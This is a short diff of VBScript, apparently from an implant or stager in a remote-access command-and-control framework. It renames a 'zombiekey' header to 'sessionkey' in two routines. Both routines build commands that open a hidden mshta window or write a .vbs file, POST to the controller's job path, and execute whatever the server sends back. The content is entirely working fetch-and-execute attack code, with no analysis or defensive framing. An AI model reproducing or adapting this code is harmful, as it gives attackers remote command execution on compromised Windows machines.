@@ -1,7 +1,7 @@
 Sub ForkWorkMSHTA(jobkey)
     cmd = "mshta vbscript:Execute(""window.blur:window.moveTo -2000,-2000:on error resume next:Set x=CreateObject(""""WinHttp.WinHttpRequest.5.1""""):"
     cmd = cmd & "x.open""""POST"""",""""" & jobpath & """"",false:"
-    cmd = cmd & "x.setRequestHeader""""zombiekey"""",""""" & zombiekey & """"":"
+    cmd = cmd & "x.setRequestHeader""""sessionkey"""",""""" & sessionkey & """"":"
     cmd = cmd & "x.setRequestHeader""""jobkey"""",""""" & jobkey & """"":"
     cmd = cmd & "x.send:Execute x.responseText"")(window.close)"
 
@@ -14,7 +14,7 @@ Sub ForkWorkWscript(jobkey)
     path = KoGetPath("~DIRECTORY~/~FILE~1.vbs")
 
     data = "on error resume next:Set x=CreateObject(""Microsoft.XMLHTTP""):x.open""POST"",""" & jobpath & """,false:"
-    data = data & "x.setRequestHeader""zombiekey"",""" & zombiekey & """:"
+    data = data & "x.setRequestHeader""sessionkey"",""" & sessionkey & """:"
     data = data & "x.setRequestHeader""jobkey"",""" & jobkey & """:"
     data = data & "x.send:Execute x.responseText"
 
